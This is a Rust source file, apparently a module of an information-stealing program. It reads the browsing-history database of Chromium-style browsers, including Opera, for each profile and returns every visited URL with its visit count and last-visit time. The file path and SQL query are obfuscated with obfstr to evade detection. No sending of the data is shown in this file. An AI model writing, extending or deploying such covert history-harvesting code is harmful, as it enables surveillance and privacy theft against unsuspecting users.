use crate::browser::utils::{Profiles, Browser, is_opera};
use rusqlite::{params, Connection};
use obfstr::obfstr as obf;

pub fn get(browser : &Browser, profile : &str) -> Vec<std::string::String> {
    let history_path = is_opera(&browser.name, &browser.path, profile.to_string(), obf!("\\History").to_string());

    if let Err(_) = std::fs::metadata(&history_path) {
        return Vec::new();
    }

    let mut history: Vec<String> = Vec::new();
    let conn = Connection::open(&history_path).unwrap();
    let mut stmt = conn
        .prepare(obf!("SELECT url, visit_count, last_visit_time FROM urls"))
        .unwrap();
    let mut rows = stmt.query([]).unwrap();

    while let Ok(row_result) = rows.next() {
        if let Some(row) = row_result {
            let url: String = row.get(0).unwrap();
            let visit_count: i64 = row.get(1).unwrap();
            let last_visit_time: i64 = row.get(2).unwrap();

            if !(url.is_empty() || visit_count <= 0) {
                history.push(format!(
                    "{}\t{}\t{}",
                    url,
                    visit_count,
                    last_visit_time
                ));
            }
        } else {
            break;
        }
    }
    history
}
